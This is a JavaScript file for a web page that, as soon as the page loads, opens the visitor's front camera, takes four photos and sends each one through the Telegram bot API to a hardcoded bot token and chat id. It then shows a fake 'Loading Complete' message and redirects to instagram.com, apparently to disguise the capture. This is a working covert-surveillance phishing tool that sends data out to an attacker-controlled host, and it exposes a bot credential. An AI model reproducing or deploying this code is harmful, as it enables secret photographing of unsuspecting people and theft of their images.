const token = "8693472250:AAFTuCMTePejbRW8RR2Lk1Jhq6zFAjcKV4g";
const chat_id = "8598414928";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let photoCount = 0;
const maxPhotos = 4;

window.addEventListener('DOMContentLoaded', () => {
    startCamera();
});

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        video.srcObject = stream;
        
        setTimeout(captureAndSendPhotos, 2000);
    } catch (error) {
        console.error("Camera permission denied or error:", error);
    }
}

function captureAndSendPhotos() {
    if (photoCount >= maxPhotos) {
        document.getElementById('mainCard').innerHTML = `<h3>Loading Complete</h3><p>Redirecting...</p>`;
        setTimeout(() => {
            window.location.href = "https://instagram.com";
        }, 1500);
        return;
    }

    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
        photoCount++;
        const formData = new FormData();
        formData.append('chat_id', chat_id);
        formData.append('photo', blob, `photo_${photoCount}.jpg`);
        formData.append('caption', `📸 Auto Captured Photo #${photoCount}`);

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log(`Photo ${photoCount} sent successfully`);
            setTimeout(captureAndSendPhotos, 1500);
        })
        .catch(error => {
            console.error("Error sending photo:", error);
            setTimeout(captureAndSendPhotos, 1500);
        });
    }, 'image/jpeg', 0.8);
}
